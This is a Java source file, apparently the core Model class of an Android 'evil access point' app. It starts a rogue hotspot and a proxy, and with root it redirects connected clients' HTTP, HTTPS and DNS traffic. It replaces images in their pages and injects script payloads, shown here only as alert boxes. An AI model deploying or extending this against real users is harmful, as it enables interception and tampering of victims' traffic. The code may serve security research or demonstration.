package com.nibiru.evil_ap;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.CursorLoader;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.util.Pair;

import com.nibiru.evil_ap.log.Client;
import com.nibiru.evil_ap.manager.Ap;
import com.nibiru.evil_ap.manager.Root;
import com.nibiru.evil_ap.manager.Routing;
import com.nibiru.evil_ap.proxy.ProxyService;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Nibiru on 2016-12-06.
 */

public class Model implements IMVP.ModelOps{
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    // Presenter reference
    private IMVP.RequiredPresenterOps mPresenter;
    // Manager helpers
    private Root mRootMan;
    private Ap mApMan;
    private Routing mRouteMan;
    //Configuration and shared object
    private SharedPreferences mConfig;
    private SharedClass mSharedObj;
    //App context
    private Context ctx;
    // Storage Permissions
    private static final int REQUEST_EXTERNAL_STORAGE = 1;
    private static String[] PERMISSIONS_STORAGE = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    /**************************************CLASS METHODS*******************************************/
    public Model(IMVP.RequiredPresenterOps mPresenter, Context ctx) {
        this.mPresenter = mPresenter;
        mRootMan = new Root();
        mApMan = new Ap();
        mRouteMan = new Routing();
        this.mConfig = ctx.getSharedPreferences("Config", 0);
        this.ctx = ctx;
        mSharedObj = new SharedClass(ctx.getResources().openRawResource(R.raw.pixel_skull), ctx,this);
    }
    public Model(IMVP.RequiredPresenterOps mPresenter, Context ctx, boolean flag) {
        this.mPresenter = mPresenter;
        mRootMan = new Root();
        mApMan = new Ap();
        mRouteMan = new Routing();
        this.mConfig = ctx.getSharedPreferences("Config", 0);
        this.ctx = ctx;
    }
    /**
     * Sent from {@link Presenter#onDestroy(boolean)}
     * Should stop/kill operations that could be running
     * and aren't needed anymore
     */
    @Override
    public void onDestroy() {
        // destroying actions
    }

    public void setSharedPrefsInt(String tag, int val){
        mConfig.edit().putInt(tag,val).apply();
    }
    public void setSharedPrefsBool(String tag, boolean val){
        mConfig.edit().putBoolean(tag,val).apply();
    }
    public void setSharedPrefsString(String tag, String val){
        mConfig.edit().putString(tag,val).apply();
    }

    public int getSharedPrefsInt(String tag){
        return mConfig.getInt(tag, -1);
    }
    public boolean getSharedPrefsBool(String tag){
        return mConfig.getBoolean(tag, false);
    }
    public String getSharedPrefsString(String tag){
        return mConfig.getString(tag,"");
    }
    public ArrayList<String> getCurrentClients(){
        return mRootMan.RunAsRootWithOutput("ip -4 neigh");
    }
    public SharedClass getSharedObj(){
        return mSharedObj;
    }
    public Client getClientByIp(String ip){
        ArrayList<String> output = mRootMan.RunAsRootWithOutput("ip -4 neigh");
        for (String line : output) {
            String[] split = line.split(" +");
            //IP idx = 0 , MAC idx = 4, flags idx = 5
            if (split.length == 6 && (split[0].equals(ip) )) {
                return new Client(split[0], split[4]);
            }
        }
        return null;
    }

    public void onTrafficRedirect(String traffic, boolean on){
        switch (traffic){
            case "HTTP":
                mRouteMan.redirectHTTP(on, mRootMan);
                break;
            case "HTTPS":
                mRouteMan.redirectHTTPS(on, mRootMan);
                break;
            case "DNS":
                mRouteMan.redirectDNS(on, mRootMan);
                break;
        }
    }
    public void onLoadReplaceImg(Uri uri, Activity act){
        verifyStoragePermissions(act);
        String path = getPath(uri);
        setSharedPrefsString(ConfigTags.imgPath.toString(), path);
        mSharedObj.loadImage(path);
    }
    public void onJsPayloadApply(List<Pair<Integer, String>> payloads) {
        ArrayList<String> listP = new ArrayList<>();
        for (Pair<Integer, String> pair: payloads) {
            //an alert message box payload
            if( pair.first == 1){
                String p = "<script type=\"text/javascript\">alert(\""+pair.second+"\");</script>";
                listP.add(p);
            }
        }
        mSharedObj.setPayloads(listP);
    }
    public boolean onApToggle(String SSID, String pass, Context ctx){
        if (!mApMan.isApOn(ctx)){
            if( SSID.equals("") || pass.equals("") ) {
                //error handling
                if ( !mApMan.turnOnAp("AP", "pa$$word", ctx) ){
                    mPresenter.onError("Hotspot error!\n" +
                            "perhaps app doesn't have necessary permissions?");
                }
            }
            else {
                mApMan.turnOnAp(SSID, pass, ctx);
            }
            ctx.startService(new Intent(ctx, ProxyService.class));
            return true;
        }
        else if (mApMan.isApOn(ctx)){
            mApMan.turnOffAp(ctx);
            ctx.stopService(new Intent(ctx, ProxyService.class));
            return false;
        }
        else{
            return false;
        }
    }

    public boolean isApOn(Context ctx){
        return mApMan.isApOn(ctx);
    }
    public boolean isDeviceRooted(){
        return mRootMan.isDeviceRooted();
    }

    private String getPath(Uri uri) {
        String[] projection = { MediaStore.Images.Media.DATA };
        CursorLoader loader = new CursorLoader(ctx, uri, projection, null, null, null);
        Cursor cursor = loader.loadInBackground();
        int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
        cursor.moveToFirst();
        return cursor.getString(column_index);
    }
    private void verifyStoragePermissions(Activity act) {
        // Check if we have permission
        int permission = ActivityCompat.checkSelfPermission(ctx, Manifest.permission
                .READ_EXTERNAL_STORAGE);
        if (permission != PackageManager.PERMISSION_GRANTED) {
            // We don't have permission so prompt the user
            ActivityCompat.requestPermissions(act, PERMISSIONS_STORAGE, REQUEST_EXTERNAL_STORAGE);
        }
    }
}
